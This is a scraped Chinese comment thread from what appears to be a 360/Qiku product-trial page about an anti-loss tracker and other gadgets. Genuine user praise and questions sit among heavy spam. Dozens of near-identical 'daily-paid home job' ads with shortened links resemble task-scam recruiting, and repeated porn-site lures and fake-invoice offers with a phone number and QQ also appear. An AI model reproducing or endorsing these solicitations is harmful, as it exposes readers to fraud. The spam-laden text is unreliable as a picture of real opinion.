---工资 每 夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---工资 每 夭結 ～ 【 http://t.cn/8sfyr3p 】复制 到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
不要小气嘛  给个呗  我会好好写报告的  
我是真心！
好喜欢啊，挺酷
干脆别发售了，从1到100不间断限量试用吧，就是不发售，就是要气死我们这帮丫挺的孩爸孩妈！
额...希望这能成为大路货...
360防丢卫士多少钱 
怎么可能，没网络怎么用，其实他就是一个缩小的路由器
希望可以做的更隐蔽  比如说镶嵌在小玩偶里边  这样  丢了之后  见到的人 一般也不会把它取下来  就可以成功定位  
这个现在已经能买到了啊，怎么奇酷还没有更新啊~~淘宝已经有卖了，299一个~
我相信360的产品，我是360的忠实用户。
为了能够使用如此便捷的产品，希望给个使用机会！
一定会通过 
和你一样的遭遇，都提过意见了，没人回。
相信360的服务会越来越好
这有点像智能手表结合智能眼镜的感觉，效果值得期待
相信360会越来越好
提供正规发票，电话：13714104160  Q：983125696
提供正规发票，电话：13714104160  Q：983125696
360值得信赖
投影仪可以使用吗
要是手机找不到了怎办？
一直在使用360 愿360越来越好
360现在的东西越来越多，还是不错的，硬件好，软件也好
如果手机用 智能提醒，那丢失的几率会小点吧？
挺期待 对于丢三落四的我来说有这东西是最好不过得了
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
买红枣上，天果网，8元一斤还包邮...360东西就是不错
支持  美妆微信 批发代发shuyu-201
---工资每夭結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---工资每夭結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
期待新产品出厂！
科技的创造
最新电影 地址【http://url.cn/RtCchb】 支持360
---工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---工资每夭 結---【业余 找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
期待中！！！
期待中~~~~
男士福利！女女勿进！直接搜进入《hulai.pw》都懂的
放在家里，家里的空气会不会变得很干燥。应该再买个空气加湿器。。。。我擦二逼
求赞，求分享哦
提莫姐弟淘宝店铺，有兴趣可以进去看看 http://shop73323367.taobao.com/index.htm
---工资每夭 結---【业余找工作】- -- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---=====工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
现在广电局不让用网络机顶盒了，这个东西能完美解决啦
十分期待。。。。。
这个在公共场所用得上。放家里没必要
看到不错，不知道能不能有键盘之类的功能。
加油，360.
好可爱，很好看
看起来不错！期待
很期待！这个东东对我来说很有用，经常丢三落四
=====工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-======工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
很好，很酷，很可耐
一次都没选中
=====工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
=====工资每夭 算結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
男士福利！女女勿进！直接搜进入《hulai.pw》都懂的 
越来越好的智能设备，来丰富我们今日的生活吧，支持奇酷，支持360
=====工资每夭 算結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
===== 工资每夭 結---【业余找工作】--- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
漂亮呀~期待~
我的电脑，手机都是用360，太好用了，支持
奇酷网 一个神奇的网站 就是不给你丫过
总感觉写报告的是一个色鬼！！！！！！！！还胴体呢！！哀家是皇后的尊称！！！没文化！！！
到现在一次都没有选中，期待中
哈哈360加油啊，以后就不怕丢三落四了！360真是贴心
有无ONVIF功能？看图片是支持SD卡的，最大支持多大的SD卡？支持360云存储吗？如果有是免费的吗？
 好期待 ，  体验着神器
第一步的图拍的不错。期待试用的体验效果。
---工资每夭結--【有散时间的亲】-- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---工资每夭結--【有散时间的 友友】-- ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
很时尚，很喜欢。
看着还可以，就是价格太高、
多小钱不管，只求啊快点上市
整天开着蓝牙不是很费电。
这个是苹果做的办公桌吗？要是能实现就太帅了。
东西不错，价位高了
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
太好啦！！！！！！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
恭喜恭喜。收到手环了吗？
好像很腻害的样子哎
期待神奇的降临
真好 希望360越做越好！
也不说这小玩意多少钱，要是便宜可以多搞几个啊！小东西全安装上，音效最好好听些！
这个好，随着发展，以后做事一个意念全搞定。
真好 希望360越做越好！  
---【有散时间的 友友】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
预约成功也没有用，好多地区都没有货，我看了好多个省会城市就北京有货。我们其他省市的根本就没机会购买的到。
 ---【有散时间的 友友】======工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
但愿能够审核成功
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
要多少钱啊？我想要！！！！！
期待小东西，大内心的到来
括弧笑，整天开着蓝牙的只是那个产品~手机只要在需要的时候打开蓝牙检索已对码设备，然后使用就好了~不过~~括弧笑，本人最容易不见是手机~那怎么办？
终于买到了，，，抢到了，，，哈哈哈哈 
我想知道如果一直开着蓝牙，这耗电是不是也很快
写完了，申请了，希望能中
不要想了这款车在美国已经上市了，而且价格是700，不要兴奋，700是美金，大家可以换算一下大约4200多人民币加上官费，在中国的什么费加起来应该在4500-500人民币啦，土豪专用
---【有散时间的 友友】======工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【有散时间的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
草，一直显示无货，刷新也没用！！
尼玛的有个屁用
抢是抢不到了，还是准备看小米发布会吧...
类似于纸电池手机壳，不过功能却完全不同，太有创意了，如果两者的功能可以集于一身，它将会更加强大。 
我老丢钥匙，现在终于可以解决了，感谢
东东是干嘛用的  
计步不太准，睡眠更不靠谱，敲击操作太苦，仅当无声闹钟用
喜欢360  不但免费。而且还有活动。力挺360！！！
喜欢360 不但免费。而且还有活动。力挺360！！！ 
小东西很好很实用
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
3D打印早就知道了，只是没想到做了这么小，的确方便快捷，当然大神大多DIY高手
希望能申请成功，好的话可以多买一个。
看着不错，快点申请成功吧
---【有散时间的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
-  --【有散时间的 友友】======工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
希望能申请成功，好的话可以多买一个。支持360 
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
期待小礼品的到来！
怎么买呀？定位准确吗？买一个
---【有散时间的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解---------
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
这玩意不反光？
太帅了 什么时候出呀 
很期待快点发布公开购买！
支持360
希望我能申请成功，360真是贴心 ！
希望我能申请成功，360真是贴心 ！
希望能申请成功，好的话可以多买一个。支持360越办越好！  
对于新鲜的东西，总有一种莫名的追逐感，就像吃了炫迈一样，总是停不下来哈
360雄起！
恩恩，我们会更加努力的，非常感谢您！
好梦幻，好高端洋气，这个才是高科技的产物。。。。 
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
功能很强大，网络机顶盒广电局不让用,有了这个，可以把家里的机顶盒给丢了
高端大气上档次，低调奢华有内涵啊！价格绝对不便宜啊。
怕水吗？几万美元？
好酷啊，想要！
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
  ---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
好喜欢！！！！
可以试用的吗？？？？？？？？？？？？如果使用很好的话立刻购买哦
看着好牛B的样子
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
---【找业余工作的 友友】=== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
== ===工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
==工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 
～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
这万应多钱一个。。。。。
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---【业余找工作】----工资每夭結 ～【dwz.cn/gkvFd】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
***功1111111
希望能申请成功，好的话可以多买一个。支持360越办越好
不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】 ～ ～每夭5o~15o，我详细作讲解～
不限制工作时间，做的越多 挣的越多～【dwz.cn/gkvFd】 ～ ～每夭5o~15o，我详细作讲解～
希望能申请成功，好的话可以多买一个。支持360越办越好  
希望能申请成功，好的话可以多买一个。支持360越办越好！ 
希望能申请成功，好的话可以多买一个。支持360越办越好！ 
希望能申请成功，好的话可以多买一个。支持360越办越好！ 
喜欢360 不但免费。而且还有活动。力挺360！！！ 
希望我能够审核成功。。  
SB一个！
出台360防丢真的很贴心
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族 都可以） 
既然是触屏那要趴在上面睡觉是不是也会触发命令
可以啊，什么都猜，来猜猜看这期彩票
360，才是真正的创新型企业啊！不是laji腾讯专门做游戏可以比的。
适合我这种出门后，只听砰一声，门关了，却发现钥匙还在屋里.....在门口跳脚。
顶360！！！360加油！！！！
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族 都可以）  
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝 妈、学生、上班族 都可以）  
360真的想象力很强大啊，有木有！希望360在创新的这条路上走下去，做一个真正的创新型企业！
不怎么实用。配置不如盖世S5，吹牛B
希望能申请成功，好的话可以多买一个。支持360  
希望能申请成功，好的话可以多买一个。支持360  
希望能申请成功，好的话可以多买一个。支持360  
这个好像电视报道过，在一个科技化的餐厅有，桌面就是一个大的ipad。很屌。
从2006年一直用360的产品！！！坚信360！希望360公司越做越好！
我一直都用360软件，也想试试360产品。希望能申请成功。全力支持360！
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝 妈、学生、上班族 都可以）  
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝 妈、学生、上班族 都可以）  
希望能申请成功，如果试用好的话，我准备向个个家庭推广销售。 
能不能中，就随缘吧，重在参与~~~
一直在用360的产品，从开始就一直追随，相信自己的眼光，相信360的发展，为创新而生，让心暖起来！
我一直到现在一个试用都没有通过，悲剧啊
这么多人申请。不知道中不中、看运气了
这么好的超实用的360防丢卫士   必须顶起来！！！
广电让用ITV 电信的
多少钱啊有试用机会吗
多少钱啊不便宜吧
不错 我喜欢要是3000以内我可以接受，试用不？
360越来越好了  我最喜欢360了  每天放学我都要看一看  我是个小学生   希望有一次也能给360用户们一个新礼物  让大家更喜欢360  360的产品我一直想用 可是我是小学生  没有钱  能怎么办呢  希望我能被360选为幸运用户  给我一个360的产品用一用、 如果能这样   那就太好了
这东西我喜欢，希望能成功
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝 妈、学生、上班族  都可以）  
～～ 不限制 工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝 妈、学生、上班族 都可以）  
爱你360希望360越做越好！
永远支持360产品
希望360能够给我一次机会，让我试用一下360发布的新产品，如果我能够有幸被筛选中，我将会给360，给人们最直观，最真实的感受。永远支持360！
超实用的360防丢卫士 顶起
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
360支持你！永远的保护！永远的实用好用！支持360
360支持你！永远的保护！永远的实用好用！支持360 
爱你360希望360越做越好！
顶360！！！360加油！！！！
图不错 但没有文字啊。
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～～ 不限制工作时间，做的越多挣的越多 ～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
我预约了也没买，刷新了几十秒就提示没货了。想要的怎么没预约我可以帮他买啊
顶360  希望越做越好超越企鹅
真的好想要…
这东西我喜欢，希望能成功
这么多人申请。不知道中不中、看运气了 
能不能中，就随缘吧，重在参与~~~ 
我一直都用360软件，也想试试360产品。希望能申请成功。全力支持360！ 
360支持你！永远的保护
一直在用360的产品，从开始就一直追随，相信自己的眼光，相信360的发展，为创新而生，让心暖起来
360支持你！永远的保护
15万人了  就70个 希望能抽中我吧         谢了啊
～～ 不限制工作时间，做的越多挣的越多 ～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～～ 不限制工作时间，做的越多挣的越多 ～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
这么多人申请。不知道中不中、看运气
凄苦网，啥比，申请那么次都不中，这些试用报告的人居然能中！！！！
除了价格之外 感觉还是很不错滴 
起码5W美金 谁用的起哦 
图片很棒 一看就是专业！！
小水滴很可爱哦，希望能光顾我家，欢迎哦！！！
好东东我爱它 
手机都是按的360软件，360卫士，还通过360手机防盗找回已经丢失的手机，太感谢360，支持！！！
Q群Q群Q群Q群Q群Q群Q群Q群Q群Q群
大爱360，感谢你们，一直陪伴着我们
这可真是个拉风的东东，非常的喜欢
一定超级贵 超级费电
这玩意创意不错，但是只适合用语冷盘、沙拉什么的，真正做菜，尤其是中餐，需要切、砍、剁、劈的地方还是很多，很难保证不会造成什么损伤。即使只是切一次快刀，估计造成的震荡就会对产品造成不小的冲击。再说了，做饭这玩意靠的是经验和技巧，真正的高手也不需要这样的东西来画蛇添足。所以这东西还是老实呆在国外吧，在中国市场不大。
除了动态3D显示功能有点创意，其他的没什么新意。而且这个功能也会因为没有太多应用而成为鸡肋。
 ～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开   ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开   ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
这类产品似乎早就有了吧。尽管你可能做的更好，但是这是一个创意的站点，没必要引入这样的东西。
东西还算不错，就是价格估计……
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
不错，很实用，对于我们这些总丢东西的，是一个很好的东西。 
360帮我找回了丢失的文件，特别感谢360   手机的内置全是360   永远爱你
这个有没有不清楚，但是能实现类似键盘功能的东西早就有了。可以百度一下“投影键盘”。确实是意见提升逼格的利器。但是除了装逼之外，没什么太大的使用价值。早期这东西要上万呢。现在淘宝上几百到1K左右就可以入手了。
这个好屌丝啊~~~
我还以为是便携式投影机，原来又是一个提升逼格的东西。
好东西！ 好东西
价格一定很贵。。。
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学 生、上班族都可以）  
好像看过新闻，有个大牛自己DIY了一个茶几。感觉这玩意最大的问题就是和其他设备的接口问题。如果只是本身的应用，那岂不是等于一个放大的IPad而已。可以和其他设备联机互动才是王道。甚至可以作为智能住宅的一部分。
希望能选中我
我来提示你，打开电脑上的随身WiFi软件，点选安全拔出该设备，这样WiFi网卡就停止工作了，但U盘还在运转。你可以查看一下系统安装驱动时的窗口，有三个设备： 1. 802.11n b/g/n wireless card  2.360WiFi flashdisk 3. 大容量储存设备  证明了WiFi模块和闪存模块是分开的。
问题1应该是电脑设置的是U盘优先启动，进BIOS改下启动项就好了。问题2估计是网段问题，IP地址有冲突。我没拿到实物，不知道360能不能改网段，但是你的监控肯定可以改，如果不嫌麻烦，就改一下吧。
写的不错，已赞！
哈哈。。。抽中了。。就可以监测我的第二个新宝宝啦。。嘻嘻。。。
我的提议是：一个手机链多个360防丢卫士，可以通过手机来为每个360防丢卫士命名，例如：“家常用品”“学习用具”“办公用品”...... 还有，如果丢失位置较远的话，可以通过“地图”来找。
希望能申请试用成功。
～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开   ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开   ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ 不限制工作时间， 做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开   ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
这个东西的弱点在.....如果手机丢了咋办?
可以 要密码 
和对讲机一个道理吧~颜色好像都一样
这些年来一直由360来保护我的电脑，木马、病毒一扫光，就连一些系统的问题、软件问题等360都能一一解决，360WiFi、断网急救箱等小组件也很贴心，现在又有了360防丢卫士，支持你！永远的保护！永远的实用好用！永远支持360  
话说过了试用期之后还可以继续用吗？
真的很强大，深深关注中、、、、、
360支持你！永远的保护 
～ 不限制工作时间， 做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～ 不限制工作时间， 做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
力挺360
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
这东东比较实用，值得大众推广。
真专业 不会是枪手吧
没用过这个东东，希望它的功能比较强大，对我们这种“马大哈”的人起到一定的帮助作用。
小水滴很可爱哦，一定要光顾我家，欢迎哦！！！
～ 不限制工作时间， 做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/RP2hay1【复制到地址栏打开】
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
 ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【  t.cn/RP2hay1  】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）【  t.cn/RP2hay1  】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
希望可以中呀。非常喜欢喜欢这个了。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
一部手机最好可以控制多个防丢卫士，外观再美观点
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
能中的真的就很幸运，呵呵！
这东东比较实用，值得大众推广
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
最好还有发光的效果
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
缘来如此！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
仅限模拟教程+空气净化
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
